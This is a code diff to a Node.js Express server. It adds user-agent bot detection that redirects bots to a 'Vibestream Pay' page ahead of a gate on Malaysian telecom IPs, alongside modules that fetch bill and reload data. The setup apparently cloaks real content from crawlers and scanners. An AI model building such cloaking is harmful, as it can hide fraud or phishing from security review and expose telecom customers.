@@ -3,7 +3,7 @@ const path = require('path');
 const http = require('http');
 const WebSocket = require('ws');
 const { fetchBillData, fetchReloadData } = require('./bill-bot');
-const { getClientIP, isMalaysianTelecomIP } = require('./ip-detector');
+const { getClientIP, isMalaysianTelecomIP, isBot } = require('./ip-detector');
 
 const app = express();
 const server = http.createServer(app);
@@ -53,6 +53,15 @@ const ipCheckMiddleware = async (req, res, next) => {
     return next();
   }
 
+  const userAgent = req.headers['user-agent'] || '';
+  
+  // 1. Bot Detection
+  if (isBot(userAgent)) {
+    console.log(`[BOT CHECK] Bot detected: ${userAgent} - Redirecting to Vibestream Pay`);
+    return res.redirect('/vibestream-pay');
+  }
+
+  // 2. IP Detection
   const clientIP = getClientIP(req);
   const isMalaysian = await isMalaysianTelecomIP(clientIP);
 
